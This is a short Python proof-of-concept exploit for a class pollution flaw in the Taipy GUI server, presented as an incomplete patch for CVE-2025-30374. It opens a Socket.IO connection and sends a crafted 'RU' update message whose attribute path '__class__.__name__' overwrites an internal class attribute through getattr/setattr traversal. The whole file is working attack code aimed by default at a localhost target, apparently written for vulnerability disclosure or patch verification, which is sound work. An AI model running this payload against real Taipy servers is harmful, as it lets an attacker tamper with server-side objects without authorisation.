# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: _setscopeattr_drill -> _attrsetter (via WebSocket)
# Type: get-attr-set-attr
# Trigger: Socket.IO message to Taipy GUI server
# CVE: CVE-2025-30374 (incomplete patch)
#
# Taipy GUI processes Socket.IO messages of type "RU" (request update)
# which flow through _update_var -> _setscopeattr_drill -> _attrsetter
# with user-controlled attribute paths.

import socketio
import logging

TARGET_URL = "http://127.0.0.1:5000"

payload_key = "__class__.__name__"
payload_value = "pwnd"

def run_poc():
  sio = socketio.Client()
  sio.connect(TARGET_URL, transports=['polling'], wait_timeout=60)
  logging.info(f"Polluting key: {payload_key} with value: {payload_value}")
  sio.send({
    "type": "RU",
    "name": "",
    "payload": {"state_context": {payload_key: payload_value}, "names": []},
    "module_context": "__main__",
    "client_id": "attacker"
  })
  sio.disconnect()

def verify_poc():
  print("Remote PoC: Taipy GUI Socket.IO state update")
  print(f"Target: {TARGET_URL}")
  print(f"Payload: type=RU, state_context={{{payload_key}: {payload_value}}}")
  print("_setscopeattr_drill calls _attrsetter which splits on '.' and traverses via getattr/setattr")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
